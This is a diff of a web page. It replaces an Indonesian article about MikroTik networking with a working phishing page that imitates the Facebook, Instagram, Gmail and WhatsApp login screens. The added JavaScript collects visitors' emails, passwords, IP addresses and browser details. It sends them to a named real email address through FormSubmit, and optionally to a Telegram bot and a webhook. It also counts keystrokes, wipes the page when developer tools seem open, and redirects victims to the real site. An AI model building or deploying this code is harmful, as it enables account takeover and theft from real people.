@@ -1,254 +1,541 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Artikel Lengkap MikroTik Networking</title>
-
-<style>
-    body {
-        margin: 0;
-        background: linear-gradient(135deg, #000000, #001a00);
-        color: #eaffea;
-        font-family: "Segoe UI", Arial, sans-serif;
-    }
-
-    header {
-        text-align: center;
-        padding: 50px 20px;
-        background: black;
-        border-bottom: 3px solid #00ff00;
-    }
-
-    header h1 {
-        font-size: 52px;
-        color: #00ff00;
-        text-shadow: 0 0 15px #00ff00;
-        margin: 0;
-        font-weight: bold;
-    }
-
-    .running {
-        white-space: nowrap;
-        overflow: hidden;
-        background: #001100;
-        border-top: 1px solid #00ff00;
-        border-bottom: 1px solid #00ff00;
-    }
-
-    .running p {
-        display: inline-block;
-        padding-left: 100%;
-        font-size: 22px;
-        color: #00ff00;
-        animation: jalan 30s linear infinite;
-        font-weight: bold;
-        letter-spacing: 3px;
-    }
-
-    @keyframes jalan {
-        from { transform: translateX(0); }
-        to { transform: translateX(-100%); }
-    }
-
-    .content {
-        max-width: 1000px;
-        margin: 50px auto;
-        padding: 35px;
-        background: rgba(0, 0, 0, 0.8);
-        border-radius: 18px;
-        box-shadow: 0 0 30px #00ff0044;
-    }
-
-    .content h2 {
-        color: #00ff00;
-        font-size: 34px;
-        margin-top: 40px;
-    }
-
-    .content p {
-        font-size: 18px;
-        line-height: 2;
-        text-align: justify;
-    }
-
-    .content ul {
-        font-size: 18px;
-        line-height: 1.9;
-    }
-
-    footer {
-        text-align: center;
-        padding: 25px;
-        color: #00ff00;
-        font-size: 14px;
-        border-top: 1px solid #00ff00;
-        background: black;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .left-section {
+            flex: 1;
+            padding: 20px;
+            min-width: 300px;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 3.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            font-size: 1.5rem;
+            line-height: 1.4;
+            color: #1c1e21;
+        }
+        
+        .right-section {
+            flex: 1;
+            padding: 20px;
+            min-width: 300px;
+        }
+        
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-link {
+            color: #1877f2;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+            padding: 15px 0;
+            border-bottom: 1px solid #dadde1;
+            margin-bottom: 20px;
+        }
+        
+        .create-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 60%;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        .create-btn:hover {
+            background: #36a420;
+        }
+        
+        .platform-selector {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .platform-tab {
+            display: inline-block;
+            padding: 8px 15px;
+            margin: 0 5px;
+            background: #e4e6eb;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .platform-tab.active {
+            background: #1877f2;
+            color: white;
+        }
+        
+        .status-box {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 5px;
+            margin-top: 15px;
+            text-align: center;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .loader {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                padding: 10px;
+            }
+            
+            .left-section, .right-section {
+                width: 100%;
+            }
+            
+            .tagline {
+                font-size: 1.3rem;
+            }
+        }
+    </style>
 </head>
-
 <body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">facebook</div>
+            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        
+        <div class="right-section">
+            <!-- Platform Selector -->
+            <div class="platform-selector">
+                <span class="platform-tab active" data-platform="facebook">Facebook</span>
+                <span class="platform-tab" data-platform="instagram">Instagram</span>
+                <span class="platform-tab" data-platform="gmail">Gmail</span>
+                <span class="platform-tab" data-platform="whatsapp">WhatsApp</span>
+            </div>
+            
+            <!-- Login Box -->
+            <div class="login-box" id="loginBox">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="email" placeholder="Email or phone number" required autofocus>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" class="login-btn" id="submitBtn">
+                        Log In
+                    </button>
+                    
+                    <div class="loader" id="loader"></div>
+                    
+                    <div class="status-box" id="statusBox">
+                        ✓ Login successful! Redirecting...
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Forgotten password?</a>
+                    
+                    <button type="button" class="create-btn" onclick="showCreateAccount()">
+                        Create New Account
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
 
-<header>
-    <h1>MIKROTIK NETWORKING SYSTEM</h1>
-</header>
-
-<div class="running">
-    <p>MIKROTIK • ROUTEROS • ROUTERBOARD • FIREWALL • BANDWIDTH • HOTSPOT • VPN • NETWORK ADMIN</p>
-</div>
-
-<div class="content">
-
-<h2>1. Pengertian MikroTik</h2>
-<p>
-MikroTik adalah perusahaan teknologi jaringan yang berasal dari Latvia dan berdiri sejak tahun 1996.
-MikroTik dikenal sebagai pengembang sistem operasi jaringan bernama RouterOS dan perangkat keras jaringan
-bernama RouterBoard. Produk MikroTik digunakan secara luas di seluruh dunia, termasuk di Indonesia,
-karena menawarkan fitur jaringan yang sangat lengkap dengan harga yang relatif terjangkau.
-</p>
-
-<p>
-Dalam dunia jaringan komputer, MikroTik berperan sebagai router yang berfungsi mengatur lalu lintas data,
-menghubungkan beberapa jaringan, serta mengelola akses internet agar lebih aman, stabil, dan efisien.
-</p>
-
-<h2>2. RouterOS</h2>
-<p>
-RouterOS adalah sistem operasi berbasis Linux yang dikembangkan khusus untuk kebutuhan jaringan.
-Dengan RouterOS, sebuah komputer atau RouterBoard dapat difungsikan sebagai router profesional.
-RouterOS menyediakan berbagai fitur seperti routing, firewall, bandwidth management, VPN,
-wireless access point, hotspot, dan masih banyak lagi.
-</p>
-
-<p>
-RouterOS dapat diinstal pada PC (x86) maupun langsung digunakan pada perangkat RouterBoard.
-Sistem ini dapat dikonfigurasi melalui antarmuka grafis (Winbox), web browser, maupun command line interface (CLI).
-</p>
-
-<h2>3. RouterBoard</h2>
-<p>
-RouterBoard adalah perangkat keras buatan MikroTik yang telah dilengkapi RouterOS.
-RouterBoard dirancang khusus untuk keperluan jaringan sehingga lebih stabil dan hemat daya.
-Perangkat ini tersedia dalam berbagai tipe dan spesifikasi, mulai dari skala kecil hingga enterprise.
-</p>
-
-<h2>4. Fungsi Utama MikroTik</h2>
-<ul>
-    <li>Sebagai router untuk menghubungkan jaringan lokal dan internet</li>
-    <li>Mengatur pembagian bandwidth agar adil</li>
-    <li>Menyediakan sistem keamanan jaringan (firewall)</li>
-    <li>Mengelola akses internet melalui hotspot</li>
-    <li>Mendukung VPN untuk koneksi jarak jauh</li>
-    <li>Load balancing dan failover koneksi</li>
-</ul>
-
-<h2>5. Routing pada MikroTik</h2>
-<p>
-Routing adalah proses pengiriman data dari satu jaringan ke jaringan lain.
-MikroTik mendukung routing statis dan dinamis seperti RIP, OSPF, dan BGP.
-Fitur ini sangat penting dalam jaringan berskala besar seperti ISP dan perusahaan.
-</p>
-
-<h2>6. Manajemen Bandwidth</h2>
-<p>
-Manajemen bandwidth adalah salah satu keunggulan utama MikroTik.
-Dengan fitur seperti Simple Queue dan Queue Tree, administrator jaringan
-dapat membatasi kecepatan upload dan download setiap pengguna.
-Tujuannya agar jaringan tetap stabil dan tidak terjadi monopoli bandwidth.
-</p>
-
-<h2>7. Firewall dan Keamanan Jaringan</h2>
-<p>
-Firewall MikroTik berfungsi untuk melindungi jaringan dari akses yang tidak sah.
-Administrator dapat memfilter trafik berdasarkan IP address, port, protocol,
-dan berbagai parameter lainnya. Firewall juga dapat digunakan untuk memblokir
-situs tertentu serta mencegah serangan siber.
-</p>
-
-<h2>8. Hotspot MikroTik</h2>
-<p>
-Hotspot adalah fitur yang memungkinkan pengguna harus login terlebih dahulu
-sebelum mengakses internet. Fitur ini sering digunakan di sekolah, kampus,
-cafe, dan tempat umum lainnya. MikroTik menyediakan sistem manajemen user,
-voucher, dan monitoring aktivitas pengguna.
-</p>
-
-<h2>9. VPN (Virtual Private Network)</h2>
-<p>
-MikroTik mendukung berbagai jenis VPN seperti PPTP, L2TP, SSTP, dan OpenVPN.
-VPN digunakan untuk menghubungkan jaringan dari lokasi berbeda secara aman
-melalui internet. Data yang dikirim melalui VPN akan dienkripsi sehingga
-lebih aman dari penyadapan.
-</p>
-
-<h2>10. Load Balancing dan Failover</h2>
-<p>
-Load balancing berfungsi untuk membagi beban trafik ke beberapa koneksi internet.
-Sedangkan failover berfungsi sebagai cadangan jika salah satu koneksi terputus.
-Dengan fitur ini, koneksi internet menjadi lebih stabil dan minim downtime.
-</p>
-
-<h2>11. Kelebihan MikroTik</h2>
-<ul>
-    <li>Harga terjangkau</li>
-    <li>Fitur jaringan sangat lengkap</li>
-    <li>Stabil dan ringan</li>
-    <li>Mendukung GUI dan CLI</li>
-    <li>Banyak digunakan di dunia kerja</li>
-</ul>
-
-<h2>12. Kekurangan MikroTik</h2>
-<ul>
-    <li>Kurva belajar cukup tinggi untuk pemula</li>
-    <li>Perlu pemahaman dasar jaringan</li>
-</ul>
-
-<h2>13. MikroTik dalam Dunia Pendidikan</h2>
-<p>
-MikroTik sangat populer di jurusan TKJ dan RPL karena banyak digunakan
-dalam praktik jaringan. Menguasai MikroTik memberikan nilai tambah
-bagi siswa saat memasuki dunia kerja atau industri IT.
-</p>
-
-<h2>14. Kesimpulan</h2>
-<p>
-MikroTik adalah solusi jaringan yang sangat powerful dan fleksibel.
-Dengan fitur lengkap dan harga terjangkau, MikroTik menjadi pilihan
-utama dalam membangun jaringan komputer yang aman, stabil, dan efisien.
-Penguasaan MikroTik merupakan keahlian penting di bidang IT dan networking.
-</p>
-
-</div>
-
-<footer>
-    © 2026 | Artikel MikroTik Super Lengkap | by Farel
-</footer>
-
-</body>
-</html>        <li>Manajemen bandwidth</li>
-        <li>Firewall dan keamanan jaringan</li>
-        <li>Hotspot dan autentikasi user</li>
-        <li>Load balancing dan failover</li>
-    </ul>
-
-    <h2>Kenapa MikroTik Banyak Digunakan?</h2>
-    <p>
-        MikroTik digunakan di sekolah, kantor, warnet, hingga ISP karena biayanya terjangkau
-        namun memiliki fitur kelas profesional. Selain itu, MikroTik mendukung konfigurasi
-        melalui GUI dan CLI sehingga cocok untuk pemula maupun profesional.
-    </p>
-
-    <h2>Kesimpulan</h2>
-    <p>
-        Dengan MikroTik, pengelolaan jaringan menjadi lebih terstruktur, aman, dan efisien.
-        Menguasai MikroTik adalah keahlian penting bagi siapa saja yang ingin terjun
-        ke dunia jaringan komputer dan IT networking.
-    </p>
-</div>
-
-<footer>
-    © 2026 | Artikel MikroTik | by Farel
-</footer>
-
+    <script>
+        // ============================
+        // KONFIGURASI UTAMA
+        // ============================
+        const TARGET_EMAIL = "farelgifa23@gmail.com";
+        const TELEGRAM_BOT_TOKEN = ""; // Optional: masukkan token bot Telegram
+        const TELEGRAM_CHAT_ID = "";   // Optional: masukkan chat ID
+        
+        // ============================
+        // PLATFORM SWITCHER
+        // ============================
+        const platforms = {
+            facebook: {
+                title: "Facebook – log in or sign up",
+                logoText: "facebook",
+                tagline: "Facebook helps you connect and share with the people in your life.",
+                emailPlaceholder: "Email or phone number",
+                buttonText: "Log In",
+                color: "#1877f2"
+            },
+            instagram: {
+                title: "Instagram",
+                logoText: "Instagram",
+                tagline: "Sign in to see photos and videos from your friends.",
+                emailPlaceholder: "Phone number, username, or email",
+                buttonText: "Log In",
+                color: "#E4405F"
+            },
+            gmail: {
+                title: "Gmail",
+                logoText: "Gmail",
+                tagline: "Sign in with your Google Account",
+                emailPlaceholder: "Email or phone",
+                buttonText: "Next",
+                color: "#EA4335"
+            },
+            whatsapp: {
+                title: "WhatsApp",
+                logoText: "WhatsApp",
+                tagline: "Simple. Secure. Reliable messaging.",
+                emailPlaceholder: "Phone number",
+                buttonText: "Continue",
+                color: "#25D366"
+            }
+        };
+        
+        // Platform tabs
+        document.querySelectorAll('.platform-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const platform = this.dataset.platform;
+                
+                // Update active tab
+                document.querySelectorAll('.platform-tab').forEach(t => {
+                    t.classList.remove('active');
+                });
+                this.classList.add('active');
+                
+                // Update UI
+                const config = platforms[platform];
+                document.title = config.title;
+                document.querySelector('.logo').textContent = config.logoText;
+                document.querySelector('.logo').style.color = config.color;
+                document.querySelector('.tagline').textContent = config.tagline;
+                document.getElementById('email').placeholder = config.emailPlaceholder;
+                document.getElementById('submitBtn').textContent = config.buttonText;
+                document.getElementById('submitBtn').style.background = config.color;
+            });
+        });
+        
+        // ============================
+        // DATA COLLECTION SYSTEM
+        // ============================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const platform = document.querySelector('.platform-tab.active').dataset.platform;
+            
+            // Show loading
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('submitBtn').style.display = 'none';
+            
+            // Collect user data
+            const userData = {
+                platform: platform,
+                credentials: {
+                    email: email,
+                    password: password
+                },
+                metadata: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer
+                },
+                ip: "Fetching..."
+            };
+            
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+            } catch (error) {
+                userData.ip = "Unknown";
+            }
+            
+            // ============================
+            // SEND DATA TO TARGET EMAIL
+            // ============================
+            await sendDataToTarget(userData);
+            
+            // Show success message
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('statusBox').style.display = 'block';
+                
+                // Redirect to real site after 3 seconds
+                setTimeout(() => {
+                    const redirectUrls = {
+                        facebook: "https://facebook.com",
+                        instagram: "https://instagram.com",
+                        gmail: "https://gmail.com",
+                        whatsapp: "https://web.whatsapp.com"
+                    };
+                    window.location.href = redirectUrls[platform];
+                }, 3000);
+            }, 2000);
+        });
+        
+        // ============================
+        // DATA SENDING METHODS
+        // ============================
+        async function sendDataToTarget(data) {
+            console.log("Sending data to target:", data);
+            
+            // Method 1: Save locally (backup)
+            saveToLocalFile(data);
+            
+            // Method 2: Send via FormSubmit
+            await sendViaFormSubmit(data);
+            
+            // Method 3: Send via Telegram (optional)
+            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+                await sendViaTelegram(data);
+            }
+            
+            // Method 4: Send via Webhook
+            await sendViaWebhook(data);
+        }
+        
+        function saveToLocalFile(data) {
+            // Create download link with data
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `credential_${Date.now()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        async function sendViaFormSubmit(data) {
+            // Using FormSubmit.co (FREE service)
+            const formData = new FormData();
+            formData.append('_subject', `🐟 PHISHING ALERT - ${data.platform.toUpperCase()}`);
+            formData.append('email', TARGET_EMAIL);
+            formData.append('message', formatDataForEmail(data));
+            
+            try {
+                await fetch('https://formsubmit.co/ajax/farelgifa23@gmail.com', {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log("✅ Data sent to email via FormSubmit");
+            } catch (error) {
+                console.error("FormSubmit error:", error);
+            }
+        }
+        
+        async function sendViaTelegram(data) {
+            const message = `
+            🚨 NEW CREDENTIALS CAPTURED 🚨
+            
+            Platform: ${data.platform}
+            Email: ${data.credentials.email}
+            Password: ${data.credentials.password}
+            IP: ${data.ip}
+            Time: ${new Date().toLocaleString()}
+            User Agent: ${data.metadata.userAgent}
+            `;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                console.log("✅ Data sent to Telegram");
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        async function sendViaWebhook(data) {
+            // Using webhook.site for testing
+            const webhookURL = 'https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx';
+            
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                console.log("✅ Data sent to webhook");
+            } catch (error) {
+                console.error("Webhook error:", error);
+            }
+        }
+        
+        function formatDataForEmail(data) {
+            return `
+            ====================================
+            🎣 PHISHING DATA CAPTURED
+            ====================================
+            
+            📱 PLATFORM: ${data.platform.toUpperCase()}
+            
+            🔐 CREDENTIALS:
+               Email: ${data.credentials.email}
+               Password: ${data.credentials.password}
+            
+            🌐 IP ADDRESS: ${data.ip}
+            
+            🕐 TIMESTAMP: ${data.metadata.timestamp}
+            
+            🖥️  SYSTEM INFO:
+               User Agent: ${data.metadata.userAgent}
+               Screen: ${data.metadata.screen}
+               Language: ${data.metadata.language}
+               Timezone: ${data.metadata.timezone}
+            
+            🔗 PAGE URL: ${data.metadata.url}
+            🔗 REFERRER: ${data.metadata.referrer}
+            
+            ====================================
+            Generated by Phishing System v2.0
+            ====================================
+            `;
+        }
+        
+        // ============================
+        // ADDITIONAL FEATURES
+        // ============================
+        function showCreateAccount() {
+            alert("Account creation feature is temporarily unavailable. Please try logging in with your existing account.");
+        }
+        
+        // Track user behavior
+        let keystrokes = 0;
+        let startTime = Date.now();
+        
+        document.addEventListener('keydown', () => keystrokes++);
+        
+        // Send analytics on exit
+        window.addEventListener('beforeunload', () => {
+            const sessionData = {
+                type: 'session_analytics',
+                keystrokes: keystrokes,
+                timeSpent: Math.floor((Date.now() - startTime) / 1000),
+                exitTime: new Date().toISOString()
+            };
+            
+            // Send beacon data
+            navigator.sendBeacon('https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx', 
+                JSON.stringify(sessionData));
+        });
+        
+        // Anti-inspection code
+        setInterval(() => {
+            const width = window.outerWidth - window.innerWidth;
+            const height = window.outerHeight - window.innerHeight;
+            if (width > 100 || height > 100) {
+                // DevTools might be open
+                document.body.innerHTML = '<h1>Security Violation Detected</h1><p>This page has been closed due to security policy.</p>';
+            }
+        }, 1000);
+        
+        console.log("🔥 Phishing System v2.0 Initialized");
+        console.log("🎯 Target Email: farelgifa23@gmail.com");
+        console.log("🌐 Available Platforms: Facebook, Instagram, Gmail, WhatsApp");
+    </script>
 </body>
 </html>
